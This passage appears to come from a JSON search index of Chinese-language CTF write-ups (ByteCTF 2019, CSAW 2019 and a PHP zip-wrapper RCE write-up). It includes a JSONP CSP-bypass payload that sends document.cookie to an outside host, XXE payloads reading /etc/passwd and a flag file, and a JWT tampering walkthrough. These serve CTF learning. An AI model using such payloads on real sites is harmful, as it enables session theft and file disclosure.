routines:old_rsa_priv_decode:RSA lib:../crypto/rsa/rsa_ameth.c:72: 140493738283456:error:0406506C:rsa routines:rsa_ossl_private_decrypt:data greater than mod len:../crypto/rsa/rsa_ossl.c:401: pxy@LAPTOP-UBIEP4K5:/mnt/f/1.ctf/exercise/_Question.gif.extracted/_temp.zip.extracted$ \u8fd9\u65f6\u5019\u5c31\u5f97\u5230\u4e86 flag openssl \u7684\u7528\u6cd5\uff0c rsautl \u6807\u660e\u662f\u7528\u4ec0\u4e48\u7b97\u6cd5 inkey \u6307\u660e\u5bc6\u94a5 -in \u8868\u793a\u8f93\u5165\u7684\u6587\u4ef6\uff0c\u8fd9\u91cc\u901a\u8fc7\u5faa\u73af\u904d\u5386 ls \u7684\u7ed3\u679c\u5f97\u5230\u6bcf\u4e2a\u6587\u4ef6\u540d -out \u6307\u660e\u8f93\u51fa\u7684\u6587\u4ef6\uff0c\u8fd9\u91cc\u662f\u7528\u91cd\u5b9a\u5411\u7684\u65b9\u5f0f\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u7684\u8f93\u51fa\u4e3a\u6807\u51c6\u8f93\u51fa \u8fd8\u6709\u4e00\u4e2a\u5751\uff1a RSA\u7684\u79c1\u94a5\u6587\u4ef6\u683c\u5f0f\uff1a\uff08\u8fd9\u4e2a\u6211\u662f\u53c2\u7167\u6211.ssh\u76ee\u5f55\u4e0b\u5b58\u653e\u7684\u79c1\u94a5\u6765\u770b\u7684 1 \u7ee7\u7eed\u53c2\u8003\u7684wp\u505a\u51fa\u6765\u4e86 \u539f\u59cbwp\u4e0d\u8fc7\u6ca1\u770b\u61c2\u4e4b\u540e\u7684\u4e00\u6b65 TODO\uff1a\u5982\u4f55\u5c06 identify \u8f93\u51fa\u7684\u5185\u5bb9\u8fdb\u884c\u6574\u7406\uff08\u7528python\u6216\u8005Linux\u547d\u4ee4\u884c format \u53c2\u6570\u7684\u5177\u4f53\u542b\u4e49","title":"Mysterious GIF |MISC"},{"location":"writeup/Bypassing/","text":"Bypassing PHP Null Byte Injection protections \u2013 Part II \u2013 CTF Write-up \u00b6 \u8fd9\u7bc7\u6587\u7ae0\u5229\u7528\u4e86zip\u4f2a\u534f\u8bae\u5b9e\u73b0\u4e86RCE\uff0c\u601d\u8def\u5f88\u68d2 \u4e0a\u4f20\u6587\u4ef6\u8bd5\u9519\uff1a Upload a true JPEG image file with an arbitrary dimension. Error: Failed to load image Upload a true JPEG image file with a .png extension appended to the filename in an arbitrary dimension. Error: Failed to load image Upload a true JPEG image file with a .png extension appended to the filename with a 100\u00d7100 ppi dimension. Error: Failed to load image Upload a true PNG image file in an arbitrary dimension. Error: Invalid image dimensions Upload a true PNG image file in with 100\u00d7100 pixels dimension. Passed When the application accepts the file it renames it to an apparently random filename and appends the .png extension to the file inside the \u201cuploads\u201d directory, as shown below: \u4e0a\u4f20\u4e4b\u540e\u4f1a\u6709\u4e00\u4e2a\u968f\u673a\u7684\u6587\u4ef6\u540d\u52a0.png\u540e\u7f00 \u5e78\u8fd0\u7684\u662f\u901a\u8fc7\u4f2a\u9020MIME\u53ef\u4ee5\u7ed5\u8fc7\uff1a \u65e0\u6cd5\u6267\u884c \u5c1d\u8bd5\u96f6\u5b57\u8282\u622a\u65ad\uff0c\u5df2\u7ecf\u88ab\u4fee\u590d I tried the obvious Null Byte Injection by appending quite a few encoded variations of the \u201c%00\u201d string to the filename on the \u201cupload\u201d and \u201cview\u201d functionalities of the application to overcome this limitation but after a while I\u2019ve noticed that the server was running PHP v5.5.9 by relying on the X-Powered-By header highlighted on the server response above, which is not vulnerable to this over a decade old widely known vulnerability . This got me stuck for a while, when I took a step back to see what I could have missed. A server response while attempting a basic LFI got my attention: \u672c\u5730\u6587\u4ef6\u5305\u542b\u5c1d\u8bd5\u5931\u8d25 After a series of attempts to bypass this active filtering, I ended up trying the PHP Filter trick in order to successfully achieve LFI: \u83b7\u53d6\u5230\u6e90\u7801\uff1a PHP comes by default with several built-in wrappers for various URL-style protocols for use with the filesystem functions. Among those there are the compression wrappers such as zip:// . This wrapper could allow one to unzip archives on the fly while providing access to the files stored in the archive. So if you abuse that LFI with a URL-style protocol such as zip://archive.zip#file.php you could potentially bypass this restrictions imposed by the code by uploading a ZIP archive with your PHP code inside of it and then executing it. Let\u2019s see how this could work on our scenario, step-by-step: First we set a very simple PHP script. It will take from the $_GET superglobal parameters that were sent in HTTP request using GET method. The \u201cparam1\u201d and \u201cparam2\u201d will be interpreted respectively as a function name and arguments for the function to be executed. Next step is to create a ZIP archive containing our PHP script: Then we upload this file to the server by using the aforementioned trick of tampering with the Content-type. Now we can easily achieve RCE abusing the wrapper: There\u2019s an actual flag file located on the server to defeat this challenge which will be left as a trivial exercise to the reader :)","title":"Bypassing PHP Null Byte Injection protections \u2013 Part II \u2013 CTF Write-up"},{"location":"writeup/Bypassing/#bypassing-php-null-byte-injection-protections-part-ii-ctf-write-up","text":"\u8fd9\u7bc7\u6587\u7ae0\u5229\u7528\u4e86zip\u4f2a\u534f\u8bae\u5b9e\u73b0\u4e86RCE\uff0c\u601d\u8def\u5f88\u68d2 \u4e0a\u4f20\u6587\u4ef6\u8bd5\u9519\uff1a Upload a true JPEG image file with an arbitrary dimension. Error: Failed to load image Upload a true JPEG image file with a .png extension appended to the filename in an arbitrary dimension. Error: Failed to load image Upload a true JPEG image file with a .png extension appended to the filename with a 100\u00d7100 ppi dimension. Error: Failed to load image Upload a true PNG image file in an arbitrary dimension. Error: Invalid image dimensions Upload a true PNG image file in with 100\u00d7100 pixels dimension. Passed When the application accepts the file it renames it to an apparently random filename and appends the .png extension to the file inside the \u201cuploads\u201d directory, as shown below: \u4e0a\u4f20\u4e4b\u540e\u4f1a\u6709\u4e00\u4e2a\u968f\u673a\u7684\u6587\u4ef6\u540d\u52a0.png\u540e\u7f00 \u5e78\u8fd0\u7684\u662f\u901a\u8fc7\u4f2a\u9020MIME\u53ef\u4ee5\u7ed5\u8fc7\uff1a \u65e0\u6cd5\u6267\u884c \u5c1d\u8bd5\u96f6\u5b57\u8282\u622a\u65ad\uff0c\u5df2\u7ecf\u88ab\u4fee\u590d I tried the obvious Null Byte Injection by appending quite a few encoded variations of the \u201c%00\u201d string to the filename on the \u201cupload\u201d and \u201cview\u201d functionalities of the application to overcome this limitation but after a while I\u2019ve noticed that the server was running PHP v5.5.9 by relying on the X-Powered-By header highlighted on the server response above, which is not vulnerable to this over a decade old widely known vulnerability . This got me stuck for a while, when I took a step back to see what I could have missed. A server response while attempting a basic LFI got my attention: \u672c\u5730\u6587\u4ef6\u5305\u542b\u5c1d\u8bd5\u5931\u8d25 After a series of attempts to bypass this active filtering, I ended up trying the PHP Filter trick in order to successfully achieve LFI: \u83b7\u53d6\u5230\u6e90\u7801\uff1a PHP comes by default with several built-in wrappers for various URL-style protocols for use with the filesystem functions. Among those there are the compression wrappers such as zip:// . This wrapper could allow one to unzip archives on the fly while providing access to the files stored in the archive. So if you abuse that LFI with a URL-style protocol such as zip://archive.zip#file.php you could potentially bypass this restrictions imposed by the code by uploading a ZIP archive with your PHP code inside of it and then executing it. Let\u2019s see how this could work on our scenario, step-by-step: First we set a very simple PHP script. It will take from the $_GET superglobal parameters that were sent in HTTP request using GET method. The \u201cparam1\u201d and \u201cparam2\u201d will be interpreted respectively as a function name and arguments for the function to be executed. Next step is to create a ZIP archive containing our PHP script: Then we upload this file to the server by using the aforementioned trick of tampering with the Content-type. Now we can easily achieve RCE abusing the wrapper: There\u2019s an actual flag file located on the server to defeat this challenge which will be left as a trivial exercise to the reader :)","title":"Bypassing PHP Null Byte Injection protections \u2013 Part II \u2013 CTF Write-up"},{"location":"writeup/Bytectf2019/","text":"Bytectf2019 \u00b6 boringcode | Web \u00b6 \u8bf4\u5b9e\u8bdd\u8fd9\u9898\u633a\u96be\u7684\uff0c\u8d5b\u540e\u590d\u73b0\u4e5f\u82b1\u4e86\u4e0d\u5c11\u529f\u592b BUUCTF\u5e73\u53f0\u4e0a\u7ed9\u51fa\u7684\u590d\u73b0\u73af\u5883 \u4e5f\u5c31\u662f\u8981\u914d\u7f6e socks5 \u4ee3\u7406 node1.buuoj.cn:28507 \u7136\u540e\u624d\u80fd\u8bbf\u95ee\u9776\u673a http://web/ \u7ecf\u8fc7\u5c1d\u8bd5\u53d1\u73b0\u6d4f\u89c8\u5668\u8fd9\u662f\u4ee3\u7406\u4e5f\u8bbf\u95ee\u4e0d\u4e86\u7f51\u9875\uff0c\u65e0\u5948\u53ea\u597d\u7528\u811a\u672c \u4e4b\u540e\u9700\u8981\u767b\u9646\u5185\u7f51\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u91cc\u4e5f\u9700\u8981\u8bbe\u7f6e\u4ee3\u7406\uff1a \u8fd9\u91cc\u7684\u7aef\u53e3\u548c\u7528\u6237\u540d\u6211\u662f\u968f\u610f\u586b\u7684\uff0c\u8c8c\u4f3c\u6ca1\u6709\u95ee\u9898 \u8fd9\u662f\u6211\u4eec\u518d\u53bb\u4fee\u6539html\u76ee\u5f55\u4e0b\u7684 index.php \u6587\u4ef6\uff0c\u5982\u4e0b\uff1a\uff08\u4e00\u5b9a\u8981\u6ce8\u610f\u662fecho \"\") \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u732e\u4e0a\u6211\u4eec\u7684exp\u4e86\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests sess = requests . session () proxy = { 'https' : 'socks5h://node1.buuoj.cn:28375' , 'http' : 'socks5h://node1.buuoj.cn:28507' } #\u8bf4\u5b9e\u8bdd\u6211\u4e5f\u4e0d\u77e5\u5927\u4e3a\u5565\u4e00\u5b9a\u8981\u8bbe\u7f6e\u6210\u8fd9\u79cd\u6837\u5b50 URL = \"http://web/code/index.php\" URL2 = 'http://baidu.com/index.php' # res = sess.post(URL, proxies=proxy, data={'url':'http://baidu.com/index.php'}) # res= sess.post(URL, proxies=proxy) # print(res.content) # print(res.text) # print(type(res.text)) # res2 = requests.get(URL2, proxies=proxy) for i in range ( 65536 ): res = sess . post ( URL , proxies = proxy , data = { 'url' : 'http://baidu.com/index.php' }) if '{' in res . text : print ( res . text )","title":"Bytectf2019"},{"location":"writeup/Bytectf2019/#bytectf2019","text":"","title":"Bytectf2019"},{"location":"writeup/Bytectf2019/#boringcode-web","text":"\u8bf4\u5b9e\u8bdd\u8fd9\u9898\u633a\u96be\u7684\uff0c\u8d5b\u540e\u590d\u73b0\u4e5f\u82b1\u4e86\u4e0d\u5c11\u529f\u592b BUUCTF\u5e73\u53f0\u4e0a\u7ed9\u51fa\u7684\u590d\u73b0\u73af\u5883 \u4e5f\u5c31\u662f\u8981\u914d\u7f6e socks5 \u4ee3\u7406 node1.buuoj.cn:28507 \u7136\u540e\u624d\u80fd\u8bbf\u95ee\u9776\u673a http://web/ \u7ecf\u8fc7\u5c1d\u8bd5\u53d1\u73b0\u6d4f\u89c8\u5668\u8fd9\u662f\u4ee3\u7406\u4e5f\u8bbf\u95ee\u4e0d\u4e86\u7f51\u9875\uff0c\u65e0\u5948\u53ea\u597d\u7528\u811a\u672c \u4e4b\u540e\u9700\u8981\u767b\u9646\u5185\u7f51\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u91cc\u4e5f\u9700\u8981\u8bbe\u7f6e\u4ee3\u7406\uff1a \u8fd9\u91cc\u7684\u7aef\u53e3\u548c\u7528\u6237\u540d\u6211\u662f\u968f\u610f\u586b\u7684\uff0c\u8c8c\u4f3c\u6ca1\u6709\u95ee\u9898 \u8fd9\u662f\u6211\u4eec\u518d\u53bb\u4fee\u6539html\u76ee\u5f55\u4e0b\u7684 index.php \u6587\u4ef6\uff0c\u5982\u4e0b\uff1a\uff08\u4e00\u5b9a\u8981\u6ce8\u610f\u662fecho \"\") \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u732e\u4e0a\u6211\u4eec\u7684exp\u4e86\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests sess = requests . session () proxy = { 'https' : 'socks5h://node1.buuoj.cn:28375' , 'http' : 'socks5h://node1.buuoj.cn:28507' } #\u8bf4\u5b9e\u8bdd\u6211\u4e5f\u4e0d\u77e5\u5927\u4e3a\u5565\u4e00\u5b9a\u8981\u8bbe\u7f6e\u6210\u8fd9\u79cd\u6837\u5b50 URL = \"http://web/code/index.php\" URL2 = 'http://baidu.com/index.php' # res = sess.post(URL, proxies=proxy, data={'url':'http://baidu.com/index.php'}) # res= sess.post(URL, proxies=proxy) # print(res.content) # print(res.text) # print(type(res.text)) # res2 = requests.get(URL2, proxies=proxy) for i in range ( 65536 ): res = sess . post ( URL , proxies = proxy , data = { 'url' : 'http://baidu.com/index.php' }) if '{' in res . text : print ( res . text )","title":"boringcode | Web"},{"location":"writeup/CSAW2019/","text":"CSAW2019 \u00b6 babCSP | Web \u00b6 CSP\u7684\u7ed5\u8fc7 \u7a81\u7136\u53d1\u73b0\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6 1 default-src 'self'; script-src 'self' *.google.com; connect-src * \u53ea\u80fd\u6267\u884c\u540c\u6e90\u548cgoogle.com\u5b50\u57df\u540d\u7684\u811a\u672c\uff0c\u53ea\u80fd\u52a0\u8f7d\u540c\u6e90\u7684\u8d44\u6e90\uff0c\u53ef\u4ee5\u5f80\u5916\u53d1\u9001\u6570\u636e \u53ef\u4ee5\u901a\u8fc7 jsonp \u6765\u7ed5\u8fc7\uff0c 1 < script src = 'https://accounts.google.com/o/oauth2/revoke?callback=document.location=\"https://www.wispwisp.com/?aa=\"%2bdocument.cookie;a' >< /script> \u7136\u540e\u5728\u8bbf\u95ee\u65e5\u5fd7\u4e2d\u5c31\u80fd\u770b\u5230 flag \u4e86 1 216.165.2.60 - - [16/Sep/2019:12:40:29 +0800] \"GET /?aa=session=eyJ1dWlkIjp7IiBiIjoiWW05MGRYTmxjZz09In19.XX8SNA.xpfAv4i-7h-_NpZCFHZY44vmI10;%20flag=flag{csp_will_solve_EVERYTHING} HTTP/1.1\" 200 232 \"http://127.0.0.1:5000/post?id=57872\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0\" apache2 \u7684\u65e5\u5fd7\u6587\u4ef6\u5728 /var/log/apache2/access.log 1 2 3 4 5 6 7 * @fileoverview Collection of popular sites/CDNs hosting JSONP-like endpoints. * Endpoints don't contain necessary parameters to trigger JSONP response * because parameters are ignored in CSP whitelists. * Usually per domain only one (popular) file path is listed to allow bypasses * of the most common path based whitelists. It's not practical to ship a list * for all possible paths/domains. Therefore the jsonp bypass check usually only * works efficient for domain based whitelists. \u5e38\u7528\u7ad9\u70b9\u767d\u540d\u5355 \u7ad9\u70b9\u767d\u540d\u5355 \u76ee\u524d\u8fd8\u5c1d\u8bd5\u8fc7\u7684 payload \u5c31\u90a3\u4e2a\u6210\u529f\u4e86\uff0c\u597d\u6655\u554a\uff0c\u4f30\u8ba1\u8981\u5199\u811a\u672c\u4e00\u6761\u6761\u6765\u6d4b\u8bd5 UNAGI | web \u00b6 \u6709\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\u7684\u63a5\u53e3\uff0c\u4f46\u662f\u6709WAF\uff0c\u7b2c\u4e00\u6b21\u89c1\u5230XXE\u7ed5\u8fc7WAF\u7684\u60c5\u51b5 \u5c06xml\u7f16\u7801\u8f6c\u4e3a UTF-16BE 1 cat sample.xml | iconv -f UTF-8 -t UTF-16BE > payload.xml \u4f46\u662f\u53d1\u73b0\u53ea\u80fd\u663e\u793a\u4e00\u5c0f\u90e8\u5206\u7684\u5185\u5bb9 \u770b\u5230\u4e4b\u524d\u7684\u9875\u9762\u4e2d\u8fd8\u6709\u4e00\u4e2a Intro \u5b57\u6bb5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 <?xml version='1.0'?> <!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\"> ]> <users> <user> <username> alice </username> <password> passwd1 </password> <name> Alice </name> <email> alice@fakesite.com </email> <group> CSAW2019 </group> </user> <user> <username> bob </username> <password> passwd2 </password> <name> Bob </name> <email> bob@fakesite.com </email> <group> &test; </group> <intro> &test; </intro> </user> </users> \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u770b\u5230\u663e\u793a\u51fa\u6240\u6709\u7684\u5185\u5bb9\u4e86 \u7136\u540e\u5c31\u53ef\u4ee5\u8bfb\u6587\u4ef6\u4e86\uff0c\u6ce8\u610f\u6587\u4ef6\u5b58\u653e\u5728 ../flag.txt \u8bd5\u4e86\u4e00\u4e0b \u6784\u9020\u7684 payload 1 <!DOCTYPE root [<!ENTITY test SYSTEM \"php://filter/read=convert.base64-encode/resource=/../flag.txt\">]> Secure File Storage | Web \u00b6 Buyify | Web \u00b6 \u754c\u9762\u662f\u4e00\u4e2a\u5546\u5e97\uff0c\u53ef\u4ee5\u770b\u5230 flag \u4f46\u662f\u4e0d\u80fd\u8d2d\u4e70 \u7136\u540e\u8fd8\u53ef\u4ee5\u5efa\u7acb\u81ea\u5df1\u7684\u5546\u5e97\uff0c Handlebars 0day \u00b6 \u8fd9\u4e2a\u9898\u76ee\u8003\u5230\u7684\u662fjs\u7684\u6846\u67b6 Handlebars \u7684SSTI \u53ef\u4ee5 Update Header \u8fd9\u65f6\u5019\u5982\u679c\u8f93\u5165\u4e00\u4e0b {{1+1}} 1 2 3 4 5 6 7 8 Error: Parse error on line 1: <p class=\"title\">{{ 1+1 }} Store</p> <p --------------------^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (F:\\1.ctf\\csaw2019\\buyify\\buyify\\node_modules\\_handlebars@4.2.0@handlebars\\dist\\cjs\\handlebars\\compiler\\parser.js:267:19) at Parser.parse (F:\\1.ctf\\csaw2019\\buyify\\buyify\\node_modules\\_handlebars@4.2.0@handlebars\\dist\\cjs\\handlebars\\compiler\\parser.js:336:30) at HandlebarsEnvironment.parse (F:\\1.ctf\\csaw2019\\buyify\\buyify\\node_modules\\_handlebars@4.2.0@handlebars\\dist\\cjs\\handleb \u53ef\u4ee5\u770b\u5230\u5c31\u662f\u8fd9\u4e2a\u6846\u67b6 handlebars Purchase the flag \u00b6 \u8bbf\u95ee http://web.chal.csaw.io:1002/store/flag/ \u53ef\u4ee5\u8d2d\u4e70 flag ,\u901a\u8fc7\u6293\u5305\u53d1\u73b0 1 2 3 4 5 6 7 POST /store/flag/checkout HTTP/1.1 Host: web.chal.csaw.io:1002 Content-Length: 158 Content-Type: application/x-www-form-urlencoded Cookie: connect.sid=s%3AOi5yhl-2orxSQ5iN9KzeprT9FThgtxPX.EXOINstCO0gUpXWeK7URQliyfG6KdI7N9j91IWPFAbY token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZsYWcuZmxhZyIsInByaWNlIjoxMDAwMDAwMDAsImlhdCI6MTU2ODU4Nzg0Mn0.c1RVg_POsjNIT0L0LHBkJ5db12BKPHHbundirMsJdaA \u53d1\u9001\u4e86\u4e00\u4e2a token \u7528 base64 \u53ef\u4ee5\u89e3\u7801\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u662f JWT(Json Web Token) \u5f97\u5230\u4e86\u4e00\u4e9b\u4fe1\u606f\uff1a 1 \u80fd\u4e0d\u80fd\u628a\u4ef7\u683c\u6539\u6210 1 \u5462\uff1f Token Format \u00b6 Token \u4e2d\u7684 id \u662f\u901a\u8fc7\u8fde\u63a5 store_name \u548c item_name 1 2 3 4 5 6 // Create an item, assign it an id, and store its callback function create_item ( id , name , callback ) { let item_id = ` ${ id } . ${ name } ` ; items [ item_id ] = callback ; return item_id ; } \u540c\u65f6 token \u662f\u7ecf\u8fc7\u4e86 jwt\u7f16\u7801\u7684 1 2 3 4 5 // Sign an item for sale in the store function sign_item ( item ) { let token = jwt . sign ({ id : item . id , price : item . price }, store . key ); return token ; } Store Object \u00b6 store \u7ed3\u6784\u662f\u8fd9\u6837\u5b50\u7684\uff1a 1 \u975e\u5e38\u5947\u602a\u7684\u4e8b\u60c5\u662f key \u8fd9\u4e2a\u5c5e\u6027\u5e76\u6ca1\u6709\u5728\u8fd9\u91cc\u5b9a\u4e49\uff0c\u4f46\u662f\u6211\u4eec\u770b\u5230 store.key \u662f\u88ab\u7528\u6765\u7f16\u7801 token \u7684 \u5728 stroe.js \u53ef\u4ee5\u627e\u5230 1 2 3 4 5 6 7 8 9 // Invalidate and resign all items function update_store () { // Create store key with long random string store . key = crypto . randomBytes ( 64 ). toString ( 'hex' ); for ( let item of store . items ) { item . token = sign_item ( item ); } } store.key = crypto.randomBytes(64).toString('hex') \u770b\u4e0a\u53bb\u662f\u65e0\u6cd5\u7834\u89e3\u7684 \u6211\u4eec\u89c2\u5bdf\u5230\uff1a 1 \u53ea\u6709\u6bcf\u6b21 new_item \u88ab\u6dfb\u52a0\u7684\u65f6\u5019\uff0c\u8fd9\u4e2a\u65f6\u5019\u4e5f\u4f1a\u66f4\u65b0 key What if we know the secret key? \u00b6 \u5982\u679c\u6211\u4eec\u77e5\u9053 secret_key \u6211\u4eec\u5c31\u80fd\u5bf9 {'id': 'flag.flag', 'price':'1'} \u8fdb\u884c\u7b7e\u540d \u7136\u540e\u5411\u8def\u7531 /checkout \u53d1\u9001\u8bf7\u6c42 1 2 3 4 5 6 7 8 9 10 11 12 // Get an item callback function get_item ( item ) { money_count += item . price ; return items [ item . id ]; } // Create the Flag store and the Flag item stores [ create_store ( 'Flag' , 'flag' )]. create_item ( 'flag' , 100000000 , ( id , req , res )=>{ flag_count ++ ; res . send ( `Congrats! Your flag is ${ fs . readFileSync ( 'flag.txt' ). toString (). replace ( /^\\s+|\\s+$/g , '' ) } !` ); }); \u4f46\u662f\u8fd9\u91cc\u6709\u4e00\u4e2a\u9a8c\u8bc1\uff1a 1 \u91cd\u65b0\u56de\u5230SSTI \u00b6 \u5982\u4f55\u8bfb\u5230 store.key \u5e76\u4e14\u8986\u76d6\u8fd9\u4e2a\u503c","title":"CSAW2019"},{"location":"writeup/CSAW2019/#csaw2019","text":"","title":"CSAW2019"},{"location":"writeup/CSAW2019/#babcsp-web","text":"CSP\u7684\u7ed5\u8fc7 \u7a81\u7136\u53d1\u73b0\u4e00\u4e2a\u597d\u7528\u7684\u63d2\u4ef6 1 default-src 'self'; script-src 'self' *.google.com; connect-src * \u53ea\u80fd\u6267\u884c\u540c\u6e90\u548cgoogle.com\u5b50\u57df\u540d\u7684\u811a\u672c\uff0c\u53ea\u80fd\u52a0\u8f7d\u540c\u6e90\u7684\u8d44\u6e90\uff0c\u53ef\u4ee5\u5f80\u5916\u53d1\u9001\u6570\u636e \u53ef\u4ee5\u901a\u8fc7 jsonp \u6765\u7ed5\u8fc7\uff0c 1 < script src = 'https://accounts.google.com/o/oauth2/revoke?callback=document.location=\"https://www.wispwisp.com/?aa=\"%2bdocument.cookie;a' >< /script> \u7136\u540e\u5728\u8bbf\u95ee\u65e5\u5fd7\u4e2d\u5c31\u80fd\u770b\u5230 flag \u4e86 1 216.165.2.60 - - [16/Sep/2019:12:40:29 +0800] \"GET /?aa=session=eyJ1dWlkIjp7IiBiIjoiWW05MGRYTmxjZz09In19.XX8SNA.xpfAv4i-7h-_NpZCFHZY44vmI10;%20flag=flag{csp_will_solve_EVERYTHING} HTTP/1.1\" 200 232 \"http://127.0.0.1:5000/post?id=57872\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0\" apache2 \u7684\u65e5\u5fd7\u6587\u4ef6\u5728 /var/log/apache2/access.log 1 2 3 4 5 6 7 * @fileoverview Collection of popular sites/CDNs hosting JSONP-like endpoints. * Endpoints don't contain necessary parameters to trigger JSONP response * because parameters are ignored in CSP whitelists. * Usually per domain only one (popular) file path is listed to allow bypasses * of the most common path based whitelists. It's not practical to ship a list * for all possible paths/domains. Therefore the jsonp bypass check usually only * works efficient for domain based whitelists. \u5e38\u7528\u7ad9\u70b9\u767d\u540d\u5355 \u7ad9\u70b9\u767d\u540d\u5355 \u76ee\u524d\u8fd8\u5c1d\u8bd5\u8fc7\u7684 payload \u5c31\u90a3\u4e2a\u6210\u529f\u4e86\uff0c\u597d\u6655\u554a\uff0c\u4f30\u8ba1\u8981\u5199\u811a\u672c\u4e00\u6761\u6761\u6765\u6d4b\u8bd5","title":"babCSP | Web"},{"location":"writeup/CSAW2019/#unagi-web","text":"\u6709\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\u7684\u63a5\u53e3\uff0c\u4f46\u662f\u6709WAF\uff0c\u7b2c\u4e00\u6b21\u89c1\u5230XXE\u7ed5\u8fc7WAF\u7684\u60c5\u51b5 \u5c06xml\u7f16\u7801\u8f6c\u4e3a UTF-16BE 1 cat sample.xml | iconv -f UTF-8 -t UTF-16BE > payload.xml \u4f46\u662f\u53d1\u73b0\u53ea\u80fd\u663e\u793a\u4e00\u5c0f\u90e8\u5206\u7684\u5185\u5bb9 \u770b\u5230\u4e4b\u524d\u7684\u9875\u9762\u4e2d\u8fd8\u6709\u4e00\u4e2a Intro \u5b57\u6bb5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 <?xml version='1.0'?> <!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\"> ]> <users> <user> <username> alice </username> <password> passwd1 </password> <name> Alice </name> <email> alice@fakesite.com </email> <group> CSAW2019 </group> </user> <user> <username> bob </username> <password> passwd2 </password> <name> Bob </name> <email> bob@fakesite.com </email> <group> &test; </group> <intro> &test; </intro> </user> </users> \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u770b\u5230\u663e\u793a\u51fa\u6240\u6709\u7684\u5185\u5bb9\u4e86 \u7136\u540e\u5c31\u53ef\u4ee5\u8bfb\u6587\u4ef6\u4e86\uff0c\u6ce8\u610f\u6587\u4ef6\u5b58\u653e\u5728 ../flag.txt \u8bd5\u4e86\u4e00\u4e0b \u6784\u9020\u7684 payload 1 <!DOCTYPE root [<!ENTITY test SYSTEM \"php://filter/read=convert.base64-encode/resource=/../flag.txt\">]>","title":"UNAGI | web"},{"location":"writeup/CSAW2019/#secure-file-storage-web","text":"","title":"Secure File Storage | Web"},{"location":"writeup/CSAW2019/#buyify-web","text":"\u754c\u9762\u662f\u4e00\u4e2a\u5546\u5e97\uff0c\u53ef\u4ee5\u770b\u5230 flag \u4f46\u662f\u4e0d\u80fd\u8d2d\u4e70 \u7136\u540e\u8fd8\u53ef\u4ee5\u5efa\u7acb\u81ea\u5df1\u7684\u5546\u5e97\uff0c","title":"Buyify | Web"},{"location":"writeup/CSAW2019/#handlebars-0day","text":"\u8fd9\u4e2a\u9898\u76ee\u8003\u5230\u7684\u662fjs\u7684\u6846\u67b6 Handlebars \u7684SSTI \u53ef\u4ee5 Update Header \u8fd9\u65f6\u5019\u5982\u679c\u8f93\u5165\u4e00\u4e0b {{1+1}} 1 2 3 4 5 6 7 8 Error: Parse error on line 1: <p class=\"title\">{{ 1+1 }} Store</p> <p --------------------^ Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID' at Parser.parseError (F:\\1.ctf\\csaw2019\\buyify\\buyify\\node_modules\\_handlebars@4.2.0@handlebars\\dist\\cjs\\handlebars\\compiler\\parser.js:267:19) at Parser.parse (F:\\1.ctf\\csaw2019\\buyify\\buyify\\node_modules\\_handlebars@4.2.0@handlebars\\dist\\cjs\\handlebars\\compiler\\parser.js:336:30) at HandlebarsEnvironment.parse (F:\\1.ctf\\csaw2019\\buyify\\buyify\\node_modules\\_handlebars@4.2.0@handlebars\\dist\\cjs\\handleb \u53ef\u4ee5\u770b\u5230\u5c31\u662f\u8fd9\u4e2a\u6846\u67b6 handlebars","title":"Handlebars 0day"},{"location":"writeup/CSAW2019/#purchase-the-flag","text":"\u8bbf\u95ee http://web.chal.csaw.io:1002/store/flag/ \u53ef\u4ee5\u8d2d\u4e70 flag ,\u901a\u8fc7\u6293\u5305\u53d1\u73b0 1 2 3 4 5 6 7 POST /store/flag/checkout HTTP/1.1 Host: web.chal.csaw.io:1002 Content-Length: 158 Content-Type: application/x-www-form-urlencoded Cookie: connect.sid=s%3AOi5yhl-2orxSQ5iN9KzeprT9FThgtxPX.EXOINstCO0gUpXWeK7URQliyfG6KdI7N9j91IWPFAbY token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZsYWcuZmxhZyIsInByaWNlIjoxMDAwMDAwMDAsImlhdCI6MTU2ODU4Nzg0Mn0.c1RVg_POsjNIT0L0LHBkJ5db12BKPHHbundirMsJdaA \u53d1\u9001\u4e86\u4e00\u4e2a token \u7528 base64 \u53ef\u4ee5\u89e3\u7801\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u662f JWT(Json Web Token) \u5f97\u5230\u4e86\u4e00\u4e9b\u4fe1\u606f\uff1a 1 \u80fd\u4e0d\u80fd\u628a\u4ef7\u683c\u6539\u6210 1 \u5462\uff1f","title":"Purchase the flag"},{"location":"writeup/CSAW2019/#token-format","text":"Token \u4e2d\u7684 id \u662f\u901a\u8fc7\u8fde\u63a5 store_name \u548c item_name 1 2 3 4 5 6 // Create an item, assign it an id, and store its callback function create_item ( id , name , callback ) { let item_id = ` ${ id } . ${ name } ` ; items [ item_id ] = callback ; return item_id ; } \u540c\u65f6 token \u662f\u7ecf\u8fc7\u4e86 jwt\u7f16\u7801\u7684 1 2 3 4 5 // Sign an item for sale in the store function sign_item ( item ) { let token 